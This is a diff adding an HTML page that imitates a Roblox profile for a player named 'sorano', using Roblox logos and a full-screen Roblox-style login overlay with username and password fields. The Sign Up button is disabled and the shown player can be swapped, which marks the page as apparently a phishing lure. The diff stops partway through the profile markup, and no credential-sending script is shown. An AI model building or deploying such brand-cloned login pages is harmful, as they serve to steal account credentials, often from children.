@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>sorano - Roblox</title>
+<style>
+  :root{
+    --ink:#191919; --muted:#6b6b6b; --line:#e3e3e3; --pill:#f2f2f2;
+    --blue:#006dff; --surface:#f7f7f8; --stroke:rgba(27,37,75,.12);
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    background:#fff;color:var(--ink);font-family:"Source Sans Pro","Segoe UI",Arial,sans-serif;
+    font-size:16px;-webkit-font-smoothing:antialiased;min-width:1344px;
+  }
+  a{color:inherit;text-decoration:none;}
+  button,input{font-family:inherit;}
+  .broken-bg{
+    background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbDpzcGFjZT0icHJlc2VydmUiIGlkPSJMYXllcl8xIiB3aWR0aD0iOTAiIGhlaWdodD0iOTAiIHg9IjAiIHk9IjAiIHZpZXdCb3g9IjAgMCA5MCA5MCI+PHN0eWxlPi5zdDJ7ZmlsbDpub25lO3N0cm9rZTojMDAwO3N0cm9rZS13aWR0aDoyO3N0cm9rZS1saW5lY2FwOnJvdW5kO3N0cm9rZS1saW5lam9pbjpyb3VuZDtzdHJva2UtbWl0ZXJsaW1pdDoxMH08L3N0eWxlPjxnIGlkPSJib3JrZW4iPjxwYXRoIGlkPSJiZyIgZD0iTTAgMGg5MHY5MEgweiIgc3R5bGU9ImZpbGw6I2ZmZiIvPjxnIGlkPSJicm9rZW4iIHN0eWxlPSJvcGFjaXR5Oi4xIj48cGF0aCBkPSJNNTEuMiAyMy41djEwLjNoMTAuM00yOC41IDQ4Ljl2MTcuNmgzM1Y1My44bC0xMS01LTExIDUtMTEtNXoiIGNsYXNzPSJzdDIiLz48cGF0aCBkPSJNNjEuNSAzMy44IDUxLjIgMjMuNUgyOC41VjQxbDExIDUgMTEtNSAxMSA1eiIgY2xhc3M9InN0MiIvPjwvZz48L2c+PC9zdmc+');
+    background-size:100% auto;background-repeat:no-repeat;background-position:center top;
+  }
+
+  /* ---------- nav ---------- */
+  .nav{height:48px;background:#fff;box-shadow:0 2px 5px rgba(0,0,0,.12);display:flex;align-items:center;padding:0 24px;position:relative;z-index:20;}
+  .logo{width:32px;height:32px;flex:0 0 32px;background-repeat:no-repeat;background-size:contain;background-position:center;cursor:pointer;}
+  .nav-links{display:flex;align-items:center;margin-left:18px;}
+  .nav-links a{font-size:15px;font-weight:600;padding:0 28px;line-height:48px;color:var(--ink);}
+  .nav-links a:first-child{padding-left:0;}
+  .search{width:334px;height:32px;background:#f2f2f2;border:1px solid #e0e0e0;border-radius:8px;display:flex;align-items:center;padding:0 12px;gap:8px;}
+  .search .ico{width:18px;height:18px;background-repeat:no-repeat;background-size:contain;opacity:.72;flex:0 0 18px;}
+  .search input{border:0;background:transparent;outline:0;font-size:15px;color:var(--ink);width:100%;padding:0;}
+  .search input::placeholder{color:#757575;}
+  .nav-right{margin-left:auto;display:flex;align-items:center;gap:8px;}
+  .btn{height:32px;border-radius:8px;padding:0 14px;font-size:14px;font-weight:700;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;border:1px solid transparent;transition:background .12s,opacity .12s;}
+  .btn:active{transform:translateY(1px);}
+  .btn-primary{background:var(--blue);color:#fff;border-color:var(--blue);}
+  .btn-primary:hover{background:#005ce0;}
+  .btn-outline{background:#fff;color:var(--ink);border-color:#b8b8b8;}
+  .btn-outline:hover{background:#f7f7f7;}
+  .btn-ghost{background:var(--pill);border-color:var(--pill);}
+  .btn-ghost:hover{background:#e9e9e9;}
+
+  /* ---------- banner ---------- */
+  .hero{height:288px;position:relative;display:flex;justify-content:center;align-items:flex-start;background:linear-gradient(180deg,#ececec 0%,#f3f3f3 50%,#fff 100%);overflow:hidden;}
+  .hero img{width:300px;height:300px;object-fit:contain;display:block;margin-top:-4px;filter:drop-shadow(0 8px 6px rgba(0,0,0,.14));transition:transform .5s;}
+  .hero.spin img{animation:turn 3.2s linear infinite;}
+  @keyframes turn{to{transform:rotateY(360deg)}}
+  .view3d{position:absolute;right:200px;top:7px;width:52px;height:32px;background:rgba(255,255,255,.6);border:1px solid rgba(0,0,0,.06);border-radius:8px;font-size:14px;font-weight:600;color:var(--ink);cursor:pointer;}
+
+  /* ---------- content ---------- */
+  .content{width:968px;margin:0 auto;position:relative;}
+  .profile-head{height:128px;margin-top:-60px;display:flex;align-items:center;position:relative;}
+  .avatar-wrap{position:relative;width:128px;height:128px;flex:0 0 128px;margin-right:12px;}
+  .avatar-wrap>img{width:128px;height:128px;border-radius:50%;object-fit:cover;display:block;background:#eee;border:2px solid #fff;box-shadow:0 0 0 1px rgba(0,0,0,.06);}
+  .status-dot{position:absolute;left:93px;top:95px;width:28px;height:28px;border-radius:50%;background-color:#fff;background-repeat:no-repeat;background-size:cover;}
+  .identity .name-row{display:flex;align-items:center;gap:8px;height:34px;}
+  .identity h1{font-size:28px;font-weight:700;margin:0;line-height:34px;letter-spacing:-.3px;cursor:pointer;}
+  .identity h1 .edit-hint{font-size:11px;color:#9a9a9a;font-weight:400;margin-left:6px;opacity:0;transition:opacity .15s;}
+  .identity:hover h1 .edit-hint{opacity:1;}
+  .pastname{width:20px;height:20px;background-repeat:no-repeat;background-size:40px auto;background-position:0 -780px;cursor:pointer;}
+  .identity .handle{font-size:14px;color:var(--muted);height:22px;line-height:22px;}
+  .actions{margin-left:auto;display:flex;align-items:center;gap:7px;}
+  .actions .btn{height:40px;width:138px;padding:0;font-size:15px;border-radius:8px;}
+  .actions .btn-dots{width:40px;font-size:18px;background:var(--pill);border-color:var(--pill);}
+  .actions .btn-dots:hover{background:#e9e9e9;}
+  .stats{display:flex;gap:7px;margin-top:16px;height:32px;}
+  .pill{background:var(--pill);border-radius:16px;padding:0 14px;font-size:14px;font-weight:600;color:var(--ink);line-height:32px;height:32px;cursor:pointer;}
+  .pill:hover{background:#e8e8e8;}
+  .bio{margin-top:16px;margin-bottom:2px;font-size:15px;line-height:20px;}
+  .bio a{text-decoration:underline;cursor:pointer;}
+  .tabs{display:flex;margin-top:0;height:46px;border-bottom:1px solid var(--line);}
+  .tab{width:50%;display:flex;justify-content:center;align-items:flex-start;font-size:14px;font-weight:600;color:#666;position:relative;cursor:pointer;}
+  .tab.active{color:var(--ink);}
+  .tab.active::after{content:"";position:absolute;left:0;right:0;bottom:-1px;height:2px;background:var(--ink);}
+  .section-title{font-size:20px;font-weight:700;margin:0;height:24px;line-height:24px;}
+  .wearing{display:flex;gap:11.5px;margin-top:14px;position:relative;height:168px;overflow:hidden;}
+  .wear-item{width:152px;height:168px;flex:0 0 152px;cursor:pointer;}
+  .wear-item .thumb{width:152px;height:152px;background-color:rgba(208,217,251,.08);background-size:contain;background-repeat:no-repeat;background-position:center;}
+  .wear-item:hover .thumb{background-color:#f0f0f0;}
+  .wear-next{position:absolute;right:0;top:70px;width:28px;height:28px;background-repeat:no-repeat;background-size:contain;cursor:pointer;z-index:2;}
+  .wear-prev{position:absolute;left:0;top:70px;width:28px;height:28px;background-repeat:no-repeat;background-size:contain;cursor:pointer;transform:rotate(180deg);z-index:2;display:none;}
+
+  /* creations tab */
+  .creations{display:none;}
+  .creations h2{font-size:20px;font-weight:700;margin:0 0 14px;height:24px;line-height:24px;}
+  .game-card{display:flex;gap:16px;border-bottom:1px solid #eee;padding-bottom:20px;}
+  .game-card>img{width:352px;height:200px;object-fit:cover;border-radius:4px;background:#f2f2f2;flex:0 0 352px;}
+  .game-info{flex:1;min-width:0;}
+  .game-info h3{font-size:20px;margin:0 0 10px;}
+  .game-info p{font-size:14px;line-height:1.45;color:#393b3d;margin:0 0 14px;}
+  .game-stats{display:flex;gap:24px;font-size:13px;color:#666;}
+  .game-stats b{display:block;font-size:18px;color:var(--ink);}
+
+  /* ---------- footer ---------- */
+  .footer{width:1072px;margin:62px auto 0;padding:39px 0 4px;text-align:center;}
+  .footer-links{display:flex;justify-content:center;align-items:center;flex-wrap:wrap;gap:26px;height:38px;}
+  .footer-links a{font-size:13px;color:#393b3d;font-weight:600;line-height:20px;}
+  .footer-links a:hover{text-decoration:underline;}
+  .privacy-ico{width:34px;height:14px;vertical-align:middle;}
+  .footer-rule{height:1px;background:#d4d4d4;margin:24px 0 0;}
+  .copy{font-size:10px;color:var(--muted);line-height:1.4;margin-top:49px;}
+
+  /* ---------- popover ---------- */
+  .popover{
+    position:absolute;width:129px;background:var(--surface);border:1px solid var(--stroke);
+    border-radius:16px;box-shadow:0 2px 4px -.5px rgba(0,0,0,.08),0 10px 20px -.75px rgba(0,0,0,.08),0 16px 32px -1px rgba(0,0,0,.08),0 48px 56px -1.5px rgba(0,0,0,.08);
+    padding:8px;z-index:60;display:none;
+  }
+  .popover.open{display:block;}
+  .popover button{
+    display:block;width:100%;height:36px;border:0;border-radius:8px;background:transparent;text-align:left;
+    padding:0 12px;font-size:14px;font-weight:600;color:#494d5a;cursor:pointer;
+  }
+  .popover button:hover{background:rgba(27,37,75,.06);}
+
+  /* ---------- generic modal ---------- */
+  .backdrop{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:200;display:none;align-items:center;justify-content:center;}
+  .backdrop.open{display:flex;}
+  .sheet{width:420px;background:#fff;border-radius:16px;box-shadow:0 12px 40px rgba(0,0,0,.25);padding:24px;}
+  .sheet h3{margin:0 0 8px;font-size:20px;}
+  .sheet p{font-size:14px;color:#555;line-height:1.45;margin:0 0 16px;}
+  .sheet label{display:block;font-size:13px;font-weight:700;margin:12px 0 4px;}
+  .sheet input[type=text]{width:100%;height:38px;border:1px solid #b8b8b8;border-radius:8px;padding:0 10px;font-size:14px;outline:none;}
+  .sheet input[type=text]:focus{border-color:var(--blue);}
+  .sheet-actions{display:flex;justify-content:flex-end;gap:8px;margin-top:20px;}
+  .sheet-actions .btn{height:36px;padding:0 18px;}
+
+  /* ---------- login overlay (Roblox style) ---------- */
+  .login{position:fixed;inset:0;z-index:500;display:none;background:radial-gradient(circle,rgba(0,0,0,.5) 60%,rgba(0,0,0,.75) 100%),url('assets/login-bg.jpg') center/cover no-repeat;color:#f7f7f8;overflow:auto;}
+  .login.open{display:block;}
+  .login-nav{height:40px;background:#232527;display:flex;align-items:center;padding:0 20px;gap:0;}
+  .login-nav .logo{width:118px;height:30px;background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMjAiIGhlaWdodD0iNjAiIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCAzMjAgNjAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Im0zOC41OCAzOC40MDQgOS4yMSAxNi44NTlIMzAuN2wtNy43NzctMTQuNDA3aC03LjM2OHYxNC40MDdIMFY0LjE5M2gyOC40NDljMTEuNzY4IDAgMTkuMjQgNi41MzIgMTkuMjQgMTguMjc4IDAgNy41NTgtMy40OCAxMi45NzItOS4xMSAxNS45MzNNMTUuNTU1IDE3LjQ2NnYxMC4xMTJoMTEuMDUyYzMuMjc0IDAgNS4zMi0xLjk0MSA1LjMyLTUuMTA3cy0yLjA0Ni01LjAwNS01LjMyLTUuMDA1em04MS42NjMgNDEuNTcxTDUwLjY1NiA0Ni40NzQgNjMuMTQxIDBsMjMuMjggNi4yODIgMjMuMjgxIDYuMjgxek04OC40MTcgMjQuODIgNzUuNDIgMjEuMjQ1bC0zLjQ4IDEyLjk3MiAxMi45OTcgMy41NzV6bTc0LjYwMiAxNi4wMzZjMCA5LjgwNS02LjI0MiAxNC40MDctMTUuOTY0IDE0LjQwN0gxMTYuNTZWNC4xOTNoMjkuNDcyYzkuNzIxIDAgMTUuOTYzIDUuMDA1IDE1Ljk2MyAxMy43ODkgMCA1LjUxNS0yLjA0NiA5LjE5My01LjkzNSAxMS43NDcgNC40MDEgMS45MzQgNi45NTkgNS44MTYgNi45NTkgMTEuMTI3TTEzMS43MDUgMTYuNDV2Ny41NThoMTAuMTI1YzIuNzYzIDAgNC40MDEtMS4yMjYgNC40MDEtMy44ODEgMC0yLjQ1Mi0xLjYzOC0zLjY3Ny00LjQwMS0zLjY3N3ptMCAyNi41NTZoMTEuMzU5YzIuNjYxIDAgNC4yMDEtMS40MyA0LjIwMS0zLjg4MyAwLTIuNjU0LTEuNTM1LTMuODgtNC4yMDEtMy44OGgtMTEuMzU5em0zOC45ODktMzguODEzaDE1LjU1MnYzNS45NDloMjIuMzA5djE1LjEyaC0zNy44NjN6bTk1LjA2OCAyNS41MzZjMCA1LjI1Mi0xLjU2IDEwLjM4Ny00LjQ4NCAxNC43NTRhMjYuNiAyNi42IDAgMCAxLTExLjk0IDkuNzggMjYuNjYgMjYuNjYgMCAwIDEtMTUuMzczIDEuNTEyIDI2LjYyIDI2LjYyIDAgMCAxLTEzLjYyMy03LjI2OCAyNi41MjEgMjYuNTIxIDAgMCAxLTUuNzY4LTI4Ljk0YzIuMDE0LTQuODUzIDUuNDI0LTkgOS44LTExLjkxOWEyNi42NCAyNi42NCAwIDAgMSAxNC43ODItNC40NzUgMjYuNTY1IDI2LjU2NSAwIDAgMSAxOC44MjcgNy43NiAyNi41IDI2LjUgMCAwIDEgNS43NjcgOC42MjEgMjYuNCAyNi40IDAgMCAxIDIuMDEyIDEwLjE3em0tMTUuNTU0IDBjMC02LjMzNC01LjAxNS0xMS4zMzktMTEuMDUyLTExLjMzOS02LjAzOCAwLTExLjA1MyA1LjAwNS0xMS4wNTMgMTEuMzM5czUuMDE1IDExLjMzNyAxMS4wNTMgMTEuMzM3YzYuMDM3IDAgMTEuMDUyLTUuMDEgMTEuMDUyLTExLjM0M3ptNTMuMDA4LS44MThMMzIwIDU1LjI2M2gtMTguNTI4bC05LjIwNS0xNS4wMi05LjUxNyAxNS4wMmgtMTguODNsMTcuNDk5LTI1Ljc0LTE2LjA2Ni0yNS4zM2gxOC41MjJsOC40OTQgMTMuNzg5IDguMTg3LTEzLjc4OWgxOC40MnoiLz48L3N2Zz4=');background-size:118px 30px;background-repeat:no-repeat;flex:0 0 118px;cursor:pointer;}
+  .login-nav .nav-links a{color:#f7f7f8;font-size:14px;padding:0 16px;}
+  .login-nav .search{background:rgba(255,255,255,.08);border-color:transparent;margin-left:6px;width:334px;height:28px;}
+  .login-nav .search input{color:#f7f7f8;}
+  .login-nav .search input::placeholder{color:#c4c4c4;}
+  .login-nav .btn-primary{height:26px;padding:0 12px;font-size:12px;}
+  .login-nav .btn-outline{height:26px;padding:0 12px;font-size:12px;background:transparent;color:#f7f7f8;border-color:#8b8b8b;}
+  .login-wrap{display:flex;flex-direction:column;align-items:center;padding-top:151px;}
+  .login-wordmark{width:186px;height:35px;background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMjAiIGhlaWdodD0iNjAiIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCAzMjAgNjAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Im0zOC41OCAzOC40MDQgOS4yMSAxNi44NTlIMzAuN2wtNy43NzctMTQuNDA3aC03LjM2OHYxNC40MDdIMFY0LjE5M2gyOC40NDljMTEuNzY4IDAgMTkuMjQgNi41MzIgMTkuMjQgMTguMjc4IDAgNy41NTgtMy40OCAxMi45NzItOS4xMSAxNS45MzNNMTUuNTU1IDE3LjQ2NnYxMC4xMTJoMTEuMDUyYzMuMjc0IDAgNS4zMi0xLjk0MSA1LjMyLTUuMTA3cy0yLjA0Ni01LjAwNS01LjMyLTUuMDA1em04MS42NjMgNDEuNTcxTDUwLjY1NiA0Ni40NzQgNjMuMTQxIDBsMjMuMjggNi4yODIgMjMuMjgxIDYuMjgxek04OC40MTcgMjQuODIgNzUuNDIgMjEuMjQ1bC0zLjQ4IDEyLjk3MiAxMi45OTcgMy41NzV6bTc0LjYwMiAxNi4wMzZjMCA5LjgwNS02LjI0MiAxNC40MDctMTUuOTY0IDE0LjQwN0gxMTYuNTZWNC4xOTNoMjkuNDcyYzkuNzIxIDAgMTUuOTYzIDUuMDA1IDE1Ljk2MyAxMy43ODkgMCA1LjUxNS0yLjA0NiA5LjE5My01LjkzNSAxMS43NDcgNC40MDEgMS45MzQgNi45NTkgNS44MTYgNi45NTkgMTEuMTI3TTEzMS43MDUgMTYuNDV2Ny41NThoMTAuMTI1YzIuNzYzIDAgNC40MDEtMS4yMjYgNC40MDEtMy44ODEgMC0yLjQ1Mi0xLjYzOC0zLjY3Ny00LjQwMS0zLjY3N3ptMCAyNi41NTZoMTEuMzU5YzIuNjYxIDAgNC4yMDEtMS40MyA0LjIwMS0zLjg4MyAwLTIuNjU0LTEuNTM1LTMuODgtNC4yMDEtMy44OGgtMTEuMzU5em0zOC45ODktMzguODEzaDE1LjU1MnYzNS45NDloMjIuMzA5djE1LjEyaC0zNy44NjN6bTk1LjA2OCAyNS41MzZjMCA1LjI1Mi0xLjU2IDEwLjM4Ny00LjQ4NCAxNC43NTRhMjYuNiAyNi42IDAgMCAxLTExLjk0IDkuNzggMjYuNjYgMjYuNjYgMCAwIDEtMTUuMzczIDEuNTEyIDI2LjYyIDI2LjYyIDAgMCAxLTEzLjYyMy03LjI2OCAyNi41MjEgMjYuNTIxIDAgMCAxLTUuNzY4LTI4Ljk0YzIuMDE0LTQuODUzIDUuNDI0LTkgOS44LTExLjkxOWEyNi42NCAyNi42NCAwIDAgMSAxNC43ODItNC40NzUgMjYuNTY1IDI2LjU2NSAwIDAgMSAxOC44MjcgNy43NiAyNi41IDI2LjUgMCAwIDEgNS43NjcgOC42MjEgMjYuNCAyNi40IDAgMCAxIDIuMDEyIDEwLjE3em0tMTUuNTU0IDBjMC02LjMzNC01LjAxNS0xMS4zMzktMTEuMDUyLTExLjMzOS02LjAzOCAwLTExLjA1MyA1LjAwNS0xMS4wNTMgMTEuMzM5czUuMDE1IDExLjMzNyAxMS4wNTMgMTEuMzM3YzYuMDM3IDAgMTEuMDUyLTUuMDEgMTEuMDUyLTExLjM0M3ptNTMuMDA4LS44MThMMzIwIDU1LjI2M2gtMTguNTI4bC05LjIwNS0xNS4wMi05LjUxNyAxNS4wMmgtMTguODNsMTcuNDk5LTI1Ljc0LTE2LjA2Ni0yNS4zM2gxOC41MjJsOC40OTQgMTMuNzg5IDguMTg3LTEzLjc4OWgxOC40MnoiLz48L3N2Zz4=');background-size:contain;background-repeat:no-repeat;margin-bottom:-10px;}
+  .login-card{width:416px;background:#191a1f;border-radius:16px;padding:52px 16px 8px;}
+  .login-card h2{font-size:20px;margin:0 0 30px;color:#f7f7f8;}
+  .login-field{margin-bottom:16px;}
+  .login-field label{display:block;font-size:14px;font-weight:700;margin-bottom:6px;color:#f7f7f8;}
+  .login-input{width:384px;height:40px;border:1px solid #8b8b8b;border-radius:8px;display:flex;align-items:center;padding:0 12px;background:rgba(0,0,0,.15);}
+  .login-input input{border:0;outline:0;background:transparent;color:#f7f7f8;font-size:16px;width:100%;}
+  .login-input input::placeholder{color:#bcbcbc;}
+  .eye{cursor:pointer;font-size:15px;color:#d5d5d5;width:22px;text-align:center;}
+  .login-submit{width:384px;height:40px;border:0;border-radius:8px;background:rgba(208,217,251,.12);color:#f7f7f8;font-weight:700;font-size:14px;cursor:pointer;margin-top:8px;}
+  .login-submit:hover{background:rgba(208,217,251,.22);}
+  .forgot{display:block;font-size:12px;color:#d0d9fb;text-decoration:underline;margin:12px 0 18px;cursor:pointer;}
+  .or{text-align:center;font-size:11px;color:#bcbcbc;position:relative;margin:6px 0 18px;}
+  .or::before,.or::after{content:"";position:absolute;top:50%;left:0;right:calc(50% + 22px);height:1px;background:rgba(255,255,255,.14);}
+  .or::after{left:calc(50% + 22px);right:0;}
+  .login-alt{width:384px;height:40px;border:0;border-radius:8px;background:rgba(208,217,251,.12);color:#f7f7f8;font-weight:700;font-size:14px;cursor:pointer;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:10px;}
+  .login-alt:not(:disabled):hover{background:rgba(208,217,251,.22);}
+  .login-alt:disabled{opacity:.55;cursor:not-allowed;}
+  .disabled-btn{opacity:.65;cursor:default;pointer-events:none;}
+  .disabled-text{cursor:default;opacity:.85;}
+  .signup-line{text-align:center;font-size:13px;font-weight:700;margin-top:20px;color:#f7f7f8;}
+  .signup-line a{text-decoration:underline;cursor:pointer;}
+  .login-toast{position:fixed;left:50%;bottom:28px;transform:translateX(-50%);background:#fff;color:#191919;padding:10px 18px;border-radius:8px;font-size:13px;font-weight:600;box-shadow:0 4px 16px rgba(0,0,0,.3);display:none;z-index:900;}
+
+  /* search results */
+  .search-results{position:absolute;top:42px;left:0;width:334px;background:#fff;border:1px solid #ddd;border-radius:8px;box-shadow:0 6px 20px rgba(0,0,0,.15);z-index:80;display:none;padding:8px 0;}
+  .search-results.open{display:block;}
+  .search-results div{padding:8px 14px;font-size:14px;cursor:pointer;}
+  .search-results div:hover{background:#f2f2f2;}
+  .search-results .sr-title{font-size:11px;color:#888;cursor:default;font-weight:700;}
+  .search-results .sr-title:hover{background:none;}
+</style>
+</head>
+<body>
+
+  <div class="nav">
+    <span class="logo" id="homeLogo" title="Roblox" style="background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NiIgaGVpZ2h0PSI1NiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDU2IDU2Ij48cGF0aCBmaWxsPSIjMzkzYjNkIiBkPSJNMTEuNjc2IDAgMCA0NC4xNjYgNDMuNTc3IDU2bDExLjY3Ni00NC4xNjZ6bTIwLjQwOSAzNS44MjctMTIuMTc3LTMuMzA4IDMuMjY0LTEyLjM0MiAxMi4xODIgMy4zMDh6Ii8+PC9zdmc+')"></span>
+    <div class="nav-links">
+      <a href="https://www.roblox.com/charts" >Charts</a><a href="https://www.roblox.com/marketplace" >Marketplace</a><a href="https://create.roblox.com" >Create</a><a href="https://www.roblox.com/robux" >Robux</a>
+    </div>
+    <div class="search" id="searchBox">
+      <span class="ico" style="background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNiIgaGVpZ2h0PSIzNiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDM2IDM2Ij48cGF0aCBmaWxsPSIjMTIxMjEyIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNSA0LjEwOEE3LjgxIDcuODEgMCAwIDAgOC42MyAxLjM2Yy0yLjkzNC4xNDctNS4zNDggMS44MzgtNi42NTcgNC4yMzhhLjc1Ljc1IDAgMSAwIDEuMzE3LjcxOGMxLjA3OS0xLjk3OCAzLjA0My0zLjM0IDUuNDE2LTMuNDU4YTYuMzEgNi4zMSAwIDAgMSA1LjA4MSAyLjE0aC0xLjY4NmEuNzUuNzUgMCAwIDAgMCAxLjVIMTYuNVYyLjFhLjc1Ljc1IDAgMCAwLTEuNSAwek0xLjUgMTEuNTA2aDQuMzk5YS43NS43NSAwIDAgMSAwIDEuNWgtMS42OGE2LjMxIDYuMzEgMCAwIDAgNS4wNzUgMi4xMzNjMi4zODQtLjEyIDQuNDAxLTEuNDg4IDUuNDA4LTMuNDQyYS43NS43NSAwIDAgMSAxLjMzMy42ODdjLTEuMjQ5IDIuNDI0LTMuNzQyIDQuMTA3LTYuNjY2IDQuMjUzQTcuODEgNy44MSAwIDAgMSAzIDEzLjg4OXYyLjAxNmEuNzUuNzUgMCAwIDEtMS41IDB2LTQuNE0xMi41IDI1LjVhNSA1IDAgMSAxLTEwIDAgNSA1IDAgMCAxIDEwIDBNMSAyNS41YTYuNSA2LjUgMCAwIDAgMTAuNDM2IDUuMTczbDQuMDc1IDQuMDcyYS44Ny44NyAwIDAgMCAxLjIzNC0uMDAyLjg3Ni44NzYgMCAwIDAtLjAwMi0xLjIzN2wtNC4wNzEtNC4wNjhBNi41IDYuNSAwIDEgMCAxIDI1LjUiIGNsaXAtcnVsZT0iZXZlbm9kZCIvPjwvc3ZnPg==')"></span>
+      <input type="text" id="searchInput" placeholder="Search" aria-label="Search" autocomplete="off">
+    </div>
+    <div class="search-results" id="searchResults">
+      <div class="sr-title">SEARCH SUGGESTIONS</div>
+      <div data-q="sorano">sorano</div>
+      <div data-q="Ultimate Sky Knock! [WIP]">Ultimate Sky Knock! [WIP]</div>
+      <div data-q="roblox">roblox</div>
+    </div>
+    <div class="nav-right">
+      <span class="btn btn-primary disabled-btn" aria-disabled="true">Sign Up</span>
+      <a href="#" class="btn btn-outline" id="navLogIn">Log In</a>
+    </div>
+  </div>
+
+  <div class="hero" id="hero">
+    <img id="heroImg" src="assets/avatar.png" alt="">
+    <button class="view3d" id="btn3d">3D</button>
+  </div>
+
+  <div class="content">
+    <div class="profile-head">
+      <div class="avatar-wrap">
+        <img id="avatarImg" src="assets/headshot.png" alt="sorano">
+        <span class="status-dot" style="background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNiIgaGVpZ2h0PSIxNDQiIHZpZXdCb3g9IjAgMCAzNiAxNDQiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAgLjMxMykiPjxjaXJjbGUgY3g9IjE4IiBjeT0iOTAiIHI9IjE2IiBmaWxsPSIjMDBhMmZmIi8+PGcgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZmZmIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIgc3Ryb2tlLXdpZHRoPSIyIj48Y2lyY2xlIGN4PSIxOCIgY3k9Ijg0IiByPSI1Ii8+PHBhdGggZD0iTTE4IDkyczUgMCA2IDEgMiA2IDIgNi0zLjEgMi04IDItOC0yLTgtMiAxLTUgMi02IDYtMSA2LTEiLz48L2c+PC9nPjwvc3ZnPg==')"></span>
+      </div>
+      <div class="identity">
+        <div class="name-row">
+          <h1 id="displayName" title="Click to change player">sorano<span class="edit-hint">edit</span></h1>
+          <span class="pastname" id="btnChange" title="Change player" style="background-image:url('assets/pastname.svg')"></span>
+        </div>
+        <div class="handle" id="handleName">@sorra_teecupz</div>
+      </div>
+      <div class="actions" style="position:relative;">
+        <button class="btn btn-primary" id="btnJoin">Join</button>
+        <button class="btn btn-outline" id="btnAdd">Add Connection</button>
+        <button class="btn btn-outline btn-dots" id="btnMoreActions">...</button>
+        <div class="popover" id="popover">
+          <button data-act="Follow">Follow</button>
+          <button data-act="Inventory">Inventory</button>
+          <button data-act="Favorites">Favorites</button>
+          <button data-act="Block User">Block User</button>
+          <button data-act="Report Abuse">Report Abuse</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="stats">
+      <span class="pill" id="statConnections">34 Connections</span>
+      <span class="pill" id="statFollowers">189.6K Followers</span>
+      <span class="pill" id="statFollowing">18 Following</span>
+    </div>
+
+    <div class="bio" id="bio"><span id="bioText">bloxz king!!</span><br><a href="#" id="bioMore">more</a></div>
+
+    <div class="tabs">
+      <div class="tab active" id="tabAbout">About</div>
+      <div class="tab" id="tabCreations">Creations</div>
+    </div>
+
+    <div id="aboutPane">
+      <h2 class="section-title">Currently Wearing</h2>
+      <div class="wearing" id="wearing">
+        <span class="wear-prev" id="wearPrev" style="background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyOCIgaGVpZ2h0PSIyOCIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI4IDI4Ij48bWFzayBpZD0iYSIgd2lkdGg9IjEwIiBoZWlnaHQ9IjE2IiB4PSIxMCIgeT0iNiIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgc3R5bGU9Im1hc2stdHlwZTphbHBoYSI+PHBhdGggZmlsbD0iI2Y3ZjdmOCIgZmlsbC1ydWxlPSJldmVub2RkIiBkPSJNMTkuNDE3IDE0YzAtLjMzMi0uMTMyLS42NS0uMzY2LS44ODRsLTYuMjUtNi4yNWExLjI1IDEuMjUgMCAwIDAtMS43NjggMS43NjhMMTYuNCAxNGwtNS4zNjYgNS4zNjZhMS4yNSAxLjI1IDAgMCAwIDEuNzY4IDEuNzY4bDYuMjUtNi4yNWExLjI1IDEuMjUgMCAwIDAgLjM2Ni0uODg0IiBjbGlwLXJ1bGU9ImV2ZW5vZGQiLz48L21hc2s+PGcgbWFzaz0idXJsKCNhKSI+PHBhdGggZmlsbD0iIzI3MjkzMCIgZD0iTS42NjcuNjY3aDI2LjY2N3YyNi42NjdILjY2N3oiLz48L2c+PC9zdmc+')"></span>
+        <div class="wear-item"><div class="thumb" style="background-image:url('assets/wear_idle.webp')"></div></div>
+        <div class="wear-item"><div class="thumb" style="background-image:url('assets/wear_back.webp')"></div></div>
+        <div class="wear-item"><div class="thumb" style="background-image:url('assets/wear_hat.webp')"></div></div>
+        <div class="wear-item"><div class="thumb" style="background-image:url('assets/wear_mood.webp')"></div></div>
+        <div class="wear-item"><div class="thumb" style="background-image:url('assets/wear_head.webp')"></div></div>
+        <div class="wear-item"><div class="thumb" style="background-image:url('assets/wear_hair.webp')"></div></div>
+        <div class="wear-item"><div class="thumb" style="background-image:url('assets/wear_dress.webp')"></div></div>
+        <div class="wear-item"><div class="thumb" style="background-image:url('assets/wear_neck.webp')"></div></div>
